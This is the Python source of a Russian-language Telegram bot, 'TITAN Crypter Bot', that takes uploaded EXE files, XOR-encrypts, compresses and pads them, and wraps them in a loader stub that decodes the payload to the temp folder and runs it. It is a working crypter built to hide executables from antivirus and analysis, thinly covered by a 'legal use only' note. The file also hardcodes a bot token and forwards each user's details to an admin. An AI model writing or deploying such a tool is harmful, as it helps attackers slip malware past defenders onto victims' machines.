import os
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
import asyncio
import threading
from datetime import datetime
import tempfile
import shutil
import random
import zlib
import base64

# Конфигурация бота
BOT_TOKEN = "8342680808:AAFo5MaFqA-ZNNLkzWRm291dSz9N2gxhJ0c"
ADMIN_CHAT_ID = 4922949598

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Упрощенная версия криптера для бота
class SimpleCrypter:
    def __init__(self):
        self.obfuscation_level = 30
        self.anti_analysis_enabled = True
        
    def simple_xor_encrypt(self, data, key):
        """Простое XOR шифрование"""
        return bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))
    
    def compress_data(self, data):
        """Сжатие данных"""
        return zlib.compress(data)
    
    def obfuscate_data(self, data):
        """Базовая обфускация"""
        # Добавляем случайные байты в начало и конец
        header = os.urandom(random.randint(10, 50))
        footer = os.urandom(random.randint(10, 50))
        return header + data + footer
    
    def create_loader_stub(self, encrypted_data, password):
        """Создание загрузчика"""
        loader_template = f'''
import zlib
import base64
import os
import tempfile
import subprocess
import sys

# Закодированные данные
ENC_DATA = b"{base64.b64encode(encrypted_data).decode()}"

# Пароль для дешифровки
PASSWORD = b"{password}"

def decrypt_data(data, key):
    """Дешифровка XOR"""
    return bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))

def main():
    try:
        # Дешифровка
        compressed_data = decrypt_data(base64.b64decode(ENC_DATA), PASSWORD)
        
        # Декомпрессия
        original_data = zlib.decompress(compressed_data)
        
        # Сохранение во временный файл
        temp_dir = tempfile.gettempdir()
        temp_file = os.path.join(temp_dir, "temp_executable.exe")
        
        with open(temp_file, "wb") as f:
            f.write(original_data)
        
        # Запуск
        subprocess.Popen([temp_file], shell=True)
        
    except Exception as e:
        print("Error:", e)

if __name__ == "__main__":
    main()
'''
        return loader_template
    
    def protect_file(self, input_path, output_path, extension='.exe'):
        """Основная функция защиты файла"""
        try:
            # Чтение исходного файла
            with open(input_path, 'rb') as f:
                original_data = f.read()
            
            # Генерация ключа
            password = os.urandom(32)
            
            # Сжатие
            compressed_data = self.compress_data(original_data)
            
            # Шифрование
            encrypted_data = self.simple_xor_encrypt(compressed_data, password)
            
            # Обфускация
            if self.obfuscation_level > 10:
                encrypted_data = self.obfuscate_data(encrypted_data)
            
            if extension == '.exe':
                # Создание Python загрузчика
                loader_code = self.create_loader_stub(encrypted_data, password)
                
                # Сохранение как Python скрипт
                with open(output_path, 'w', encoding='utf-8') as f:
                    f.write(loader_code)
                
                return True, "Файл защищен успешно"
            else:
                # Для других расширений - просто сохраняем зашифрованные данные
                with open(output_path, 'wb') as f:
                    f.write(encrypted_data)
                
                return True, "Файл защищен успешно"
                
        except Exception as e:
            return False, f"Ошибка: {str(e)}"

class TitanCrypterBot:
    def __init__(self):
        # Исправленная инициализация Application
        self.application = Application.builder().token(BOT_TOKEN).build()
        self.user_sessions = {}
        self.crypter = SimpleCrypter()
        self.setup_handlers()
        
    def setup_handlers(self):
        """Настройка обработчиков команд"""
        self.application.add_handler(CommandHandler("start", self.start))
        self.application.add_handler(CommandHandler("help", self.help_command))
        self.application.add_handler(CallbackQueryHandler(self.button_handler))
        self.application.add_handler(MessageHandler(filters.Document.ALL, self.handle_document))
        self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
        
    async def notify_admin(self, message: str):
        """Отправка уведомления администратору"""
        try:
            await self.application.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=message,
                parse_mode='HTML'
            )
            logger.info("Уведомление отправлено админу")
        except Exception as e:
            logger.error(f"Ошибка отправки уведомления админу: {e}")

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Обработка команды /start"""
        try:
            user = update.effective_user
            chat_id = update.effective_chat.id
            
            logger.info(f"Новый пользователь: {user.id} - {user.first_name}")
            
            # Уведомление администратору о новом пользователе
            user_info = (
                f"🆕 <b>Новый пользователь</b>\n"
                f"👤 ID: {user.id}\n"
                f"📛 Имя: {user.first_name}\n"
                f"📱 Username: @{user.username if user.username else 'N/A'}\n"
                f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
            await self.notify_admin(user_info)
            
            # Инициализация сессии пользователя
            self.user_sessions[chat_id] = {
                'step': 'main_menu',
                'file_path': None,
                'user_info': f"{user.first_name} (@{user.username})" if user.username else user.first_name,
                'settings': {
                    'obfuscation_level': 20,
                    'extension': '.exe',
                    'anti_analysis': True
                }
            }
            
            # Главное меню
            keyboard = [
                [InlineKeyboardButton("📁 Загрузить EXE файл", callback_data="upload_file")],
                [InlineKeyboardButton("⚙️ Настройки", callback_data="settings")],
                [InlineKeyboardButton("❓ Помощь", callback_data="help")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                "🔒 <b>TITAN Crypter Bot</b>\n\n"
                "Профессиональный инструмент для защиты исполняемых файлов\n\n"
                "Выберите действие:",
                reply_markup=reply_markup,
                parse_mode='HTML'
            )
            
        except Exception as e:
            logger.error(f"Ошибка в start: {e}")
            await update.message.reply_text("❌ Произошла ошибка. Попробуйте еще раз.")

    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Команда помощи"""
        help_text = (
            "🤖 <b>TITAN Crypter Bot - Помощь</b>\n\n"
            "📁 <b>Как использовать:</b>\n"
            "1. Нажмите 'Загрузить EXE файл'\n"
            "2. Отправьте EXE файл боту\n"
            "3. Настройте параметры защиты\n"
            "4. Запустите процесс защиты\n\n"
            "⚙️ <b>Настройки:</b>\n"
            "• Уровень обфускации\n"
            "• Расширение выходного файла\n"
            "• Анти-анализ\n\n"
            "⚠️ <b>Внимание:</b> Используйте только для легальных целей!"
        )
        
        keyboard = [[InlineKeyboardButton("🔙 Назад", callback_data="main_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(help_text, reply_markup=reply_markup, parse_mode='HTML')

    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Обработка загруженного файла"""
        try:
            chat_id = update.effective_chat.id
            user = update.effective_user
            
            if chat_id not in self.user_sessions:
                await update.message.reply_text("❌ Сначала запустите бота командой /start")
                return
                
            document = update.message.document
            file_name = document.file_name or "unknown.exe"
            
            if not file_name.lower().endswith('.exe'):
                await update.message.reply_text("❌ Поддерживаются только EXE файлы!")
                return
                
            # Проверка размера файла
            if document.file_size > 20 * 1024 * 1024:  # 20MB limit
                await update.message.reply_text("❌ Файл слишком большой! Максимальный размер: 20MB")
                return
            
            # Скачивание файла
            file = await context.bot.get_file(document.file_id)
            temp_dir = tempfile.mkdtemp()
            file_path = os.path.join(temp_dir, file_name)
            
            await file.download_to_drive(file_path)
            
            # Проверка что файл действительно EXE
            try:
                with open(file_path, 'rb') as f:
                    header = f.read(2)
                    if header != b'MZ':
                        await update.message.reply_text("❌ Это не валидный EXE файл!")
                        shutil.rmtree(temp_dir)
                        return
            except:
                await update.message.reply_text("❌ Ошибка проверки файла!")
                shutil.rmtree(temp_dir)
                return
            
            # Сохранение в сессии
            self.user_sessions[chat_id]['file_path'] = file_path
            self.user_sessions[chat_id]['step'] = 'file_uploaded'
            
            # Уведомление администратору
            action_info = (
                f"📥 <b>Пользователь загрузил файл</b>\n"
                f"👤 ID: {user.id}\n"
                f"📛 Имя: {user.first_name}\n"
                f"📄 Файл: {file_name}\n"
                f"📏 Размер: {document.file_size} байт\n"
                f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}"
            )
            await self.notify_admin(action_info)
            
            # Меню после загрузки файла
            keyboard = [
                [InlineKeyboardButton("⚙️ Настроить параметры", callback_data="configure")],
                [InlineKeyboardButton("🔒 Запустить защиту", callback_data="protect")],
                [InlineKeyboardButton("📁 Загрузить другой файл", callback_data="upload_file")],
                [InlineKeyboardButton("🔙 Главное меню", callback_data="main_menu")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                f"✅ <b>Файл успешно загружен!</b>\n\n"
                f"📄 Имя: {file_name}\n"
                f"📏 Размер: {document.file_size} байт\n\n"
                "Теперь вы можете настроить параметры защиты или сразу запустить процесс:",
                reply_markup=reply_markup,
                parse_mode='HTML'
            )
            
        except Exception as e:
            logger.error(f"Ошибка обработки документа: {e}")
            await update.message.reply_text("❌ Ошибка при загрузке файла!")

    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Обработка текстовых сообщений"""
        chat_id = update.effective_chat.id
        text = update.message.text
        
        if chat_id in self.user_sessions:
            if self.user_sessions[chat_id]['step'] == 'waiting_obfuscation':
                try:
                    level = int(text)
                    if 1 <= level <= 30:
                        self.user_sessions[chat_id]['settings']['obfuscation_level'] = level
                        self.user_sessions[chat_id]['step'] = 'file_uploaded'
                        await update.message.reply_text(f"✅ Уровень обфускации установлен: {level}")
                    else:
                        await update.message.reply_text("❌ Введите число от 1 до 30")
                except:
                    await update.message.reply_text("❌ Введите корректное число")

    async def show_settings(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Показать настройки"""
        try:
            chat_id = update.effective_chat.id
            if chat_id not in self.user_sessions:
                await self.start(update, context)
                return
                
            settings = self.user_sessions[chat_id]['settings']
            
            settings_text = (
                "⚙️ <b>Настройки защиты</b>\n\n"
                f"🔢 Уровень обфускации: <b>{settings['obfuscation_level']}/30</b>\n"
                f"📁 Расширение: <b>{settings['extension']}</b>\n"
                f"🔍 Анти-анализ: <b>{'Включено' if settings['anti_analysis'] else 'Выключено'}</b>"
            )
            
            keyboard = [
                [
                    InlineKeyboardButton("🔢 Уровень обфускации", callback_data="set_obfuscation"),
                    InlineKeyboardButton("📁 Расширение", callback_data="set_extension")
                ],
                [
                    InlineKeyboardButton("🔍 Анти-анализ", callback_data="toggle_anti_analysis"),
                    InlineKeyboardButton("💾 Сохранить", callback_data="save_settings")
                ],
                [InlineKeyboardButton("🔙 Назад", callback_data="main_menu")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            if update.callback_query:
                await update.callback_query.edit_message_text(
                    settings_text, 
                    reply_markup=reply_markup, 
                    parse_mode='HTML'
                )
            else:
                await update.message.reply_text(
                    settings_text, 
                    reply_markup=reply_markup, 
                    parse_mode='HTML'
                )
        except Exception as e:
            logger.error(f"Ошибка в show_settings: {e}")

    async def show_obfuscation_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Меню настройки уровня обфускации"""
        try:
            chat_id = update.effective_chat.id
            current_level = self.user_sessions[chat_id]['settings']['obfuscation_level']
            
            keyboard = [
                [InlineKeyboardButton("🔽 Низкий (10)", callback_data="set_obl_10")],
                [InlineKeyboardButton("🔼 Средний (20)", callback_data="set_obl_20")],
                [InlineKeyboardButton("🚀 Высокий (30)", callback_data="set_obl_30")],
                [InlineKeyboardButton("🔙 Назад", callback_data="settings")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.callback_query.edit_message_text(
                f"🔢 <b>Настройка уровня обфускации</b>\n\n"
                f"Текущий уровень: <b>{current_level}/30</b>\n\n"
                "Выберите уровень:",
                reply_markup=reply_markup,
                parse_mode='HTML'
            )
        except Exception as e:
            logger.error(f"Ошибка в show_obfuscation_menu: {e}")

    async def show_extension_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Меню выбора расширения"""
        try:
            chat_id = update.effective_chat.id
            current_ext = self.user_sessions[chat_id]['settings']['extension']
            
            extensions = ['.exe', '.py', '.bat', '.txt']
            
            keyboard = []
            for ext in extensions:
                keyboard.append([InlineKeyboardButton(
                    f"📁 {ext} {'✅' if ext == current_ext else ''}", 
                    callback_data=f"set_ext_{ext}"
                )])
            
            keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data="settings")])
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.callback_query.edit_message_text(
                "📁 <b>Выбор расширения выходного файла</b>\n\n"
                f"Текущее расширение: <b>{current_ext}</b>",
                reply_markup=reply_markup,
                parse_mode='HTML'
            )
        except Exception as e:
            logger.error(f"Ошибка в show_extension_menu: {e}")

    def run_async_in_thread(self, chat_id, context):
        """Запуск асинхронной функции в отдельном потоке"""
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(self.process_protection(chat_id, context))
        except Exception as e:
            logger.error(f"Ошибка в потоке: {e}")
        finally:
            loop.close()

    async def process_protection(self, chat_id: int, context: ContextTypes.DEFAULT_TYPE):
        """Обработка защиты файла"""
        try:
            session = self.user_sessions.get(chat_id)
            if not session:
                await context.bot.send_message(chat_id, "❌ Сессия устарела! Начните с /start")
                return
                
            file_path = session.get('file_path')
            
            if not file_path or not os.path.exists(file_path):
                await context.bot.send_message(chat_id, "❌ Файл не найден! Загрузите файл заново.")
                return
            
            settings = session['settings']
            
            # Настройка криптера
            self.crypter.obfuscation_level = settings['obfuscation_level']
            self.crypter.anti_analysis_enabled = settings['anti_analysis']
            
            # Создание выходного файла
            output_filename = f"protected_{datetime.now().strftime('%H%M%S')}{settings['extension']}"
            output_path = os.path.join(tempfile.gettempdir(), output_filename)
            
            # Прогресс-сообщения
            progress_messages = [
                "🔄 Проверка файла...",
                "📖 Чтение данных...",
                "🔒 Шифрование...",
                "📦 Сжатие...",
                "🚀 Создание защиты...",
                "✅ Завершение..."
            ]
            
            for i, message in enumerate(progress_messages):
                progress = (i + 1) * 20
                await context.bot.send_message(chat_id, f"{message} ({progress}%)")
                await asyncio.sleep(1)
            
            # Запуск защиты
            success, result_message = self.crypter.protect_file(file_path, output_path, settings['extension'])
            
            if success and os.path.exists(output_path):
                file_size = os.path.getsize(output_path)
                
                with open(output_path, 'rb') as f:
                    await context.bot.send_document(
                        chat_id,
                        document=f,
                        caption=(
                            f"✅ <b>Файл успешно защищен!</b>\n\n"
                            f"📁 Расширение: {settings['extension']}\n"
                            f"🔢 Уровень обфускации: {settings['obfuscation_level']}/30\n"
                            f"📏 Размер: {file_size} байт"
                        ),
                        filename=output_filename,
                        parse_mode='HTML'
                    )
                
                # Уведомление администратору
                user_info = session.get('user_info', 'Unknown')
                action_info = (
                    f"🔒 <b>Успешная защита файла</b>\n"
                    f"👤 Пользователь: {user_info}\n"
                    f"👤 ID: {chat_id}\n"
                    f"📄 Файл: {output_filename}\n"
                    f"📏 Размер: {file_size} байт\n"
                    f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}"
                )
                await self.notify_admin(action_info)
                
            else:
                await context.bot.send_message(chat_id, f"❌ Ошибка: {result_message}")
                
        except Exception as e:
            logger.error(f"Ошибка обработки файла: {e}")
            await context.bot.send_message(chat_id, f"❌ Критическая ошибка: {str(e)}")
        finally:
            # Очистка временных файлов
            try:
                session = self.user_sessions.get(chat_id)
                if session and session.get('file_path'):
                    file_dir = os.path.dirname(session['file_path'])
                    if file_dir and os.path.exists(file_dir):
                        shutil.rmtree(file_dir)
            except Exception as e:
                logger.error(f"Ошибка очистки временных файлов: {e}")

    async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Обработчик нажатий на кнопки"""
        try:
            query = update.callback_query
            await query.answer()
            
            chat_id = query.message.chat_id
            data = query.data
            
            # Инициализация сессии если нужно
            if chat_id not in self.user_sessions:
                self.user_sessions[chat_id] = {
                    'step': 'main_menu', 
                    'settings': {
                        'obfuscation_level': 20,
                        'extension': '.exe',
                        'anti_analysis': True
                    }
                }
            
            # Обработка действий
            if data == "main_menu":
                keyboard = [
                    [InlineKeyboardButton("📁 Загрузить EXE файл", callback_data="upload_file")],
                    [InlineKeyboardButton("⚙️ Настройки", callback_data="settings")],
                    [InlineKeyboardButton("❓ Помощь", callback_data="help")]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                
                await query.edit_message_text(
                    "🔒 <b>TITAN Crypter Bot</b>\n\nВыберите действие:",
                    reply_markup=reply_markup,
                    parse_mode='HTML'
                )
                
            elif data == "upload_file":
                await query.edit_message_text(
                    "📁 <b>Загрузка файла</b>\n\n"
                    "Пожалуйста, отправьте EXE файл как документ:",
                    parse_mode='HTML'
                )
                
            elif data == "settings":
                await self.show_settings(update, context)
                
            elif data == "help":
                await self.help_command(update, context)
                
            elif data == "configure":
                await self.show_settings(update, context)
                
            elif data == "set_obfuscation":
                await self.show_obfuscation_menu(update, context)
                
            elif data == "set_extension":
                await self.show_extension_menu(update, context)
                
            elif data.startswith("set_obl_"):
                level = int(data.split('_')[2])
                self.user_sessions[chat_id]['settings']['obfuscation_level'] = level
                await query.edit_message_text(f"✅ Уровень установлен: {level}")
                await asyncio.sleep(1)
                await self.show_settings(update, context)
                
            elif data.startswith("set_ext_"):
                extension = data.split('_', 2)[2]
                self.user_sessions[chat_id]['settings']['extension'] = extension
                await query.edit_message_text(f"✅ Расширение установлено: {extension}")
                await asyncio.sleep(1)
                await self.show_settings(update, context)
                
            elif data == "toggle_anti_analysis":
                current = self.user_sessions[chat_id]['settings']['anti_analysis']
                self.user_sessions[chat_id]['settings']['anti_analysis'] = not current
                status = "включен" if not current else "выключен"
                await query.edit_message_text(f"✅ Анти-анализ {status}")
                await asyncio.sleep(1)
                await self.show_settings(update, context)
                
            elif data == "save_settings":
                await query.edit_message_text("✅ Настройки сохранены!")
                await asyncio.sleep(1)
                await self.show_settings(update, context)
                
            elif data == "protect":
                if not self.user_sessions[chat_id].get('file_path'):
                    await query.edit_message_text("❌ Сначала загрузите файл!")
                    return
                    
                await query.edit_message_text("🚀 Запуск защиты...")
                
                # Запуск в отдельном потоке
                thread = threading.Thread(
                    target=self.run_async_in_thread,
                    args=(chat_id, context)
                )
                thread.daemon = True
                thread.start()
                
        except Exception as e:
            logger.error(f"Ошибка в button_handler: {e}")

    def run(self):
        """Запуск бота"""
        try:
            logger.info("Бот запускается...")
            print("Titan Crypter Bot запускается...")
            print(f"Токен: {BOT_TOKEN}")
            print(f"Admin ID: {ADMIN_CHAT_ID}")
            
            # Исправленный запуск polling
            self.application.run_polling(
                allowed_updates=Update.ALL_TYPES,
                drop_pending_updates=True
            )
            
        except KeyboardInterrupt:
            logger.info("Бот остановлен пользователем")
            print("\nБот остановлен")
        except Exception as e:
            logger.error(f"Критическая ошибка при запуске: {e}")
            print(f"Критическая ошибка: {e}")

if __name__ == "__main__":
    # Проверка токена
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ Установите токен бота!")
        exit(1)
        
    bot = TitanCrypterBot()
    bot.run()
